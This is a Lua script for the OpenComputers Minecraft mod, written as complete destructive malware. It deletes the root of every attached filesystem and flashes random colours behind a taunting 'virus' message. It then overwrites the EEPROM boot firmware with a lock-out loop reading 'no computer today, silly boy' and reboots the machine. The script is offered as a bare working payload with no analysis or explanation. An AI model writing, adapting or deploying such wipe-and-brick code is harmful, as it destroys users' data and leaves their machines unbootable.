local cp, cl = component.proxy, component.list
local gpu = cp(cl("gpu")())
local efi = cp(cl("eeprom")())

local resX, resY = gpu.getResolution()

for filesystem in component.list("filesystem") do 
	component.invoke(filesystem, "remove", "/")
end

local back = 0x27ba8c
local textback = back - 0x333333
local front = 0xFFFFFF - textback

gpu.setBackground(back)
gpu.setForeground(front)

gpu.fill(1, 1, resX, resY, " ")

local function sleep(timeout)
	local deadline = computer.uptime() + (timeout or 0)
	repeat
		computer.pullSignal(deadline - computer.uptime())
	until computer.uptime() >= deadline
end



local text = "                          It looks like your scary dream has come true - you have a virus on your computer and is has died. That was the last time you used it."

while true do
	back = math.random(0x000000, 0xFFFFFF)
	textback = back - 0x333333
	front = 0xFFFFFF - textback
	gpu.setBackground(back)
	gpu.setForeground(front)
	gpu.fill(1, 1, resX, resY, " ")
	gpu.setBackground(textback)

	text = string.sub(text, 2)
	gpu.set(1, resY, text .. "                                                                                                                                                                                                          ")
	sleep(0.125)

	if text == "" then
		break
	end
end

efi.set("local a,b=component.proxy,component.list;local c=a(b(\"gpu\")())local d=a(b(\"eeprom\")())local e,f=c.getResolution()local g=0x27ba8c;local h=g-0x333333;local i=0xFFFFFF-h;c.setBackground(g)c.setForeground(i)c.fill(1,1,e,f,\" \")local function j(k)local l=computer.uptime()+(k or 0)repeat computer.pullSignal(l-computer.uptime())until computer.uptime()>=l end;local m=\"no computer today, silly boy\"local n=\"go outside to play\"while true do g=math.random(0x000000,0xFFFFFF)h=g-0x333333;i=0xFFFFFF-h;c.setBackground(g)c.setForeground(i)c.fill(1,1,e,f,\" \")c.setBackground(h)c.set(e/2-#m/2,f/2,m)c.set(e/2-#n/2,f/2+1,n)j(0.125)end")
computer.shutdown(true)